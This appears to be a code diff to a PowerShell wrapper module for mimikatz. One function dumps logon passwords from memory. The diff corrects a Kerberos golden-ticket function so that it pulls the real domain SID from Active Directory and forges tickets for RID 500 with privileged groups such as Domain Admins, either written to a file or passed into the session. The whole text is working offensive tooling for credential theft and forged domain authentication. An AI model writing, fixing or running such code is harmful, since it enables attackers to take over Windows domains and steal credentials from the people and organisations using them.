@@ -1,3 +1,5 @@
+
+
 function Get-MKLogonPassword {
     mimikatz.exe privilege::debug sekurlsa::logonpasswords exit | ConvertFrom-MKOutput -OutputType LogonPasswords
 }
@@ -61,7 +63,9 @@ function Grant-MKKerberosGoldenTicket {
         [Parameter()]
         [string]$Domain = (Get-ADDomain | Select-Object -ExpandProperty DNSRoot).Trim(),
         [Parameter()]
-        [string]$Sid = '500',
+        [string]$Sid = (Get-ADDomain | Select-Object -ExpandProperty DomainSID).ToString().Trim(),
+        [Parameter()]
+        [string]$Id = '500',
         [Parameter()]
         [string[]]$Groups = @('501','502','513','512','520','518','519'),
         [Parameter()]
@@ -73,12 +77,12 @@ function Grant-MKKerberosGoldenTicket {
     $GroupString = $groups -join ','
 
     if ($TicketPath) {
-        mimikatz.exe privilege::debug "kerberos::golden /user:$User /domain:$Domain /sid:$Sid /rc4:$KrbtgtNtlmHash /groups:$GroupString /ticket:$TicketPath" exit   
+        mimikatz.exe privilege::debug "kerberos::golden /user:$User /domain:$Domain /sid:$Sid /Id:$Id /rc4:$KrbtgtNtlmHash /groups:$GroupString /ticket:$TicketPath" exit   
     } else {
 
         Write-Debug " mimikatz.exe privilege::debug `"kerberos::golden /user:$User /domain:$Domain /sid:$Sid /rc4:$KrbtgtNtlmHash /groups:$GroupString /ptt`" exit"
 
-        mimikatz.exe privilege::debug "kerberos::golden /user:$User /domain:$Domain /sid:$Sid /rc4:$KrbtgtNtlmHash /groups:$GroupString /ptt" exit
+        mimikatz.exe privilege::debug "kerberos::golden /user:$User /domain:$Domain /sid:$Sid  /Id:$Id /rc4:$KrbtgtNtlmHash /groups:$GroupString /ptt" exit
     }
 }
 
